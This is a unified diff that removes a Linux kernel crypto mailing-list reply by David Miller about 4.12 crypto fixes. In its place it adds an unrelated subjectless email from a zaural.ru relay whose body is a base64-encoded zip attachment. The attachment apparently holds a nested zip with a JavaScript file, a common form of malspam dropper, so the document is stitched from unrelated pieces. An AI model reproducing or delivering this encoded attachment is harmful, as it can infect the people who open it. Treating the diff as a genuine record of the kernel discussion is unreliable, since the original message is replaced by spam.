@@ -1,30 +1,74 @@
-From: David Miller <davem@davemloft.net>
-Subject: Re: Crypto Fixes for 4.12
-Date: Thu, 08 Jun 2017 10:05:02 -0400 (EDT)
-Message-ID: <20170608.100502.1861332545609152555.davem@davemloft.net>
-References: <20170304074119.GA3041@gondor.apana.org.au>
-        <20170523034211.GA12748@gondor.apana.org.au>
-        <20170608092320.GA6478@gondor.apana.org.au>
+From: <service@burdadirect.de>
+Subject: (unknown)
+Date: Thu, 08 Jun 2017 14:09:52 -0000
+Message-ID: <149693099243.12492.4824137131260868631@zaural.ru>
 Mime-Version: 1.0
-Content-Type: Text/Plain; charset=us-ascii
-Content-Transfer-Encoding: 7bit
-Cc: torvalds@linux-foundation.org, linux-kernel@vger.kernel.org,
-        linux-crypto@vger.kernel.org
-To: herbert@gondor.apana.org.au
-Return-path: <linux-kernel-owner@vger.kernel.org>
-In-Reply-To: <20170608092320.GA6478@gondor.apana.org.au>
-Sender: linux-kernel-owner@vger.kernel.org
-List-Id: linux-crypto.vger.kernel.org
+Content-Type: application/zip; name="7779404973035.zip"
+Content-Transfer-Encoding: base64
+To: <linux-crypto@vger.kernel.org>
+Return-path: <linux-crypto-owner@vger.kernel.org>
+Received: from ws35.zone31-163-153.zaural.ru ([31.163.153.35]:47028 "HELO
+        zaural.ru" rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org with SMTP
+        id S1751550AbdFHOJ4 (ORCPT <rfc822;linux-crypto@vger.kernel.org>);
+        Thu, 8 Jun 2017 10:09:56 -0400
+Content-Disposition: attachment
+Subject: 
+Sender: linux-crypto-owner@vger.kernel.org
+List-ID: <linux-crypto.vger.kernel.org>
 
-From: Herbert Xu <herbert@gondor.apana.org.au>
-Date: Thu, 8 Jun 2017 17:23:21 +0800
-
-> This push fixes a couple of places in the crypto code that were
-> doing interruptible sleeps dangerously.  They have been converted
-> to use non-interruptible sleeps.  This push also fixes a bug in
-> asymmetric_keys where it would trigger a use-after-free if a
-> request returned EBUSY due to a full device queue.
-
-Where is the gcc shash miscompile workaround?
-
-Thanks.
+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
+4AsAAAAA
